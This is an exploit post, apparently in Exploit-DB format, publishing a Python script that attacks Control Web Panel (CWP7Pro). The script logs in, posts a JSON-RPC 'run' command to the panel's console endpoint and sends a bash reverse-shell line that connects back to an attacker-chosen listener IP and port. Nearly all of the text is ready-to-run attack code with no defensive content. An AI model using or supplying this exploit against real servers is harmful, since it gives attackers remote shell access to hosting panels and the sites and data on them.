---
layout: post
title: Control Web Panel (CWP7Pro) - Remote Code Execution
date: 2023-08-02
category: exploit
---

# Exploit Title: Control Web Panel (CWP7Pro) - Remote Code Execution
# Exploit Author: Ahmet Ümit BAYRAM
# Date: 02.08.2023
# Vendor Homepage: https://control-webpanel.com
# Tested on: Ubuntu & Windows
# CVE : N/A

```python
import requests

username = input("Please enter your username: ")
password = input("Please enter your password: ")
url = input("Please enter the CWP URL (without 'http://'): ")
port = input("Please enter the CWP port: ")
ip_listener = input("Please enter the IP for the listener: ")
port_listener = input("Please enter the port for the listener: ")

s = requests.Session()

login_data = {"username": username, "password": password, "commit": "Login"}
login_url = f"http://{url}:{port}/login/index.php"
r = s.post(login_url, data=login_data, allow_redirects=False)  

if r.status_code == 302 and 'Location' in r.headers:
    print("Login successful")

    redirect_url = f"http://{url}:{port}" + r.headers['Location']
    console_url = redirect_url.replace('index.php?chk=y', 'console.php')

    command = f"sh -i >& /dev/tcp/{ip_listener}/{port_listener} 0>&1"
    console_data = {
        "jsonrpc": "2.0",
        "method": "run",
        "params": ["NO_LOGIN", {"user": "", "hostname": "", "path": ""}, command],
        "id": 1
    }
    try:
        s.post(console_url, json=console_data, timeout=3)  # Trigger RCE
    except requests.exceptions.Timeout:
        pass  

    print("Check your listener!")
    exit()
else:
    print("Login failed")
